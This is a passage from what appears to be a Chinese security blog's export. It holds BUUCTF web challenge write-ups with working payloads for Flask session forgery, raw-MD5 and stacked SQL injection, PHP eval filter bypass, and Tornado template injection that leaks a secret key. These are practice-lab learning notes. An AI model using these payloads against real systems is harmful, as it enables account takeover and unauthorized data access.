解密加密的脚本\n\n构造payload：\n\n```\npython flask_session_cookie_manager3.py decode -c \".eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png)\n\n得到：\n\n```\n{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'abc', 'user_id': '10'}\n```\n\n将我们创建的abc改为admin 然后再加密 bp抓包修改\n\n构造payload：\n\n```\npython flask_session_cookie_manager3.py encode -t \"{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'admin', 'user_id': '10'}\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png)\n\n得到：\n\n```\n.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY\n```\n\n更换session，成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png)\n","tags":["弱口令","flask框架","session伪造","unicode特殊字符"],"categories":["buuctf"]},{"title":"buuctf 21-[BJDCTF2020]Easy MD5","url":"/post/eef45ee2.html","content":"\nbuuctf [BJDCTF2020]Easy MD5\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347242.png)\n\n思路：看到url上又password字样，又有输入栏，随便传入admin然后抓包试试，发现提示。\n\n![img](https://cdn.nlark.com/yuque/0/2023/png/34855848/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png)\n\n显示`select * from 'admin' where password=md5($pass,true)`\n\n**分析：通过sql语句，从admin表里查数据，当password=md（）函数加密后的pass时就可查询。**\n\n**考点：**\n\n1. **sql语句注入**\n2. **md5（）函数：本来应该返回32 位的十六进制数形式散列值，但是此题可选的 binary 被设置为 true，那么 md5 摘要将以 16 位的原始二进制格式返回。**\n\n看到作业提示md5在sql注入中常见的搭档是字符串ffifdyop，然后去谷歌，csdn看看这是什么东西。\n\n**ffifdyop**\n\n经过[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)加密后：276f722736c95d99e921722cf9ed621c\n\n再转换为[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)：'or'6<乱码>  即  'or'66�]��!r,��b\n\n**原理：md5（）函数先把** `**ffifdyop**`**加密为**`**276f722736c95d99e921722cf9ed621c**`**Mysql 又会把 hex （十六进制）转成 ascii 解释** \n\n 在or的两边要有单引号，使它变成 password=‘xxx’or‘xxx’ 的形式  \n\n 因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’  为一个永真式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347249.png)\n\n\n\n输入得到代码：\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n**分析：通过get传参a，b，使得题目md5值弱相等 。**\n\n**方法：**\n\n1. **数组绕过**\n2. **md5（）值碰撞，有一些特殊的数值在md5（）加密后会形成0e开头的字符串，从而达到弱相等**\n\n**md5（）碰撞原理：**\n\n```php\n<?php\n$a=md5('QNKCDZO');\n$b=md5('s878926199a');\necho $a;\necho \"\\n\";\necho $b;\necho \"\\n\";\nif($a==$b)\n{\n    echo \"他们弱相等\";\n}\n?>\n输出：\n0e830400451993494058024219903391\n0e545993274517709034328855841020\n他们弱相等\n```\n\n选择任何方法都行，之后得到：\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\n\nhighlight_file(__FILE__);\n\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\n同理，不过之后是强类型相等，估计这一关是考察数组绕过吧，之后得到flag\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347369.png)\n","tags":["md5绕过","ffifdyop特殊字符串"],"categories":["buuctf"]},{"title":"buuctf 20-[护网杯 2018]easy_tornado","url":"/post/98e6259a.html","content":"\nbuuctf 20-[护网杯 2018]easy_tornado\n\n<!--more-->\n\n这是一道毫无头绪的题目，就当作学习了。\n\n进入之后有三个页面内容分别为：\n\nflag in /fllllllllllllag\n\nrender\n\nmd5(cookie_secret+md5(filename))\n\n发现请求过程很奇怪\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349588.png)\n\n通过filename请求一个文件然后filehash请求一个哈西值 也就是加密了一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349619.png)\n\n如果不请求哈希值试一下 直接报错，并且注意：`/error?msg=Error`直接来看大佬的wp\n\nrender是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过`{{}}`进行传递变量和执行简单的表达式。\n\nTornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快\n\n在tornado模板中，存在一些可以访问的快速对象,这里用到的是`handler.settings`，`handler`指向`RequestHandler`，而`RequestHandler.settings`又指向`self.application.settings`，所以handler.settings就指向`RequestHandler.application.settings`了，这里面就是我们的一些环境变量.\n\n然后通过环境变量去获取`cookie_secret`\n\n构造payload ：`/error?msg={{handler.settings}}`\n\n得到：`{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '76a26309-3853-4c68-b91e-eee75246e722'}`\n\n发现了`cookie_secret `\n\n之后将`/fllllllllllllag`加密一下将`cookie_secret` 加上 再进行一次md5加密就可以获得flag了\n\n构造payload：`?filename=/fllllllllllllag&filehash=99d14d071426405f00eca73ec4a5eb64`\n\n成功！\n","tags":["render渲染","python","环境变量"],"categories":["buuctf"]},{"title":"buuctf 18-[RoarCTF 2019]Easy Calc","url":"/post/318fd29a.html","content":"\nbuuctf 18-[RoarCTF 2019]Easy Calc\n\n<!--more-->\n\n抓包发现提交方式为：\n\n给/cal.php 以get方式提交一个$num变量\n\n发现黑名单过滤\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\n发现好多读文件的空格，斜杠都被黑名单了。\n\ncsdn有一篇总结的很好，拉过来\n\n知识点：\n\nchr() 函数：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。\n\n file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。\n\n PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。\n\n scandir() 函数：返回指定目录中的文件和目录的数组。\n\n构造：`? num=var_dump(scandir(chr(47)))`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082348852.png)\n\n发现flag文件，现在构造payload将里面内容读出来就行了\n\n```\n? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\n这里最好不用echo 因为空格被黑名单了 用print_r或者var_dump都行\n","tags":["文件包含","php字符串解析特性"],"categories":["buuctf"]},{"title":"buuctf 6-[强网杯 2019]随便注","url":"/post/73bb3fc4.html","content":"\nbuuctf [强网杯 2019]随便注\n\n<!--more-->\n\n正常操作后，发现只有两列，然后有正则匹配过滤了\n\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n\n这题考了堆叠注入，原理很简单，就是通过 `;` 号注入多条SQL语句。\n\n```\n-1';show databases;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349074.png)\n\n看一下当前的数据库，这里考到了报错注入\n\n原理：\n\nMySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。\n\n但是这题update被过滤了\n\nextractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。\n\nsql里拼接函数：concat，concat_ws ,group_concat\n\n`1' and extractvalue(1,concat(0x7e,database(),0x7e));` 0x7e 是十六进制~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349098.png)\n\n当前数据库在supersqli 注意结果是按照报错的方式回显的。\n\n`-1';show tables;`爆表\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349087.png)\n\nflag在那串数字里\n\n表名为数字时，要用反引号包起来查询。\n\n```\n-1';show columns from `1919810931114514`;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349045.png)\n\n然后要使用存储过程预编译知识，构造能执行的语句\n\n方法一：\n\nset @name1 = sql 语句；\n\nprepare name2 from @name1\n\nEXECUTE name2\n\n注意：一个@是用户变量，两个@是系统变量\n\n方法二：\n\nprepare name1 from 一个sql语句;\n\nEXECUTE name1；\n\n\n\nname1,name2的意思是一个名字\n\n其实两者原理都一样\n\n构造：\n\n```\n1';set @a = concat('se','lect * from `1919810931114514`;');prepare b from @a;EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349034.png)\n\nstrstr()函数对大小写很敏感，通过大写绕过即可。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349106.png)\n\n```\n1';Set @a = concat('se','lect * from `1919810931114514`;'); Prepare b from @a; EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349435.png)\n","tags":["sql注入","堆叠注入","报错注入"],"categories":["buuctf"]},{"title":"小破站破壳了","url":"/post/1c316701.html","content":"\n想来想去，看了其他许多大佬的文章，起初萌生了想建造一个属于自己的网站，但是建站不是一个简单的事情，只靠我现在的知识水平是完全不够的，于是就想简单简答的建造一个博客，用来分享我的一些做题过程与生活琐事。\n\n<!--more-->\n\n2023.2.5，今天属于我的博客小破站建成了（开心~），虽然只是简单运用了hexo和大家都知道的next主题，傻瓜式建造最后上传至github，但是整个过程还是蛮曲折的，建造过程报了好多错误，但是还是靠着查询一点一点修改，最终一个简简单单的小博客站建好了。\n\n在这个博客中我会用来分享一些做题刷题的过程，其实就是监督自己，不要三天打鱼两天晒网。如果你看到我的wp中有错误，我非常欢迎您能给我指出。其次分享一下自己在生活中的所见所闻所感，让之后的自己回味会觉得之前的日子过得有意义一点。\n\n希望我能守住自己的初心\n\n2023.2.5 \n\nZ1d10t\n\n"}]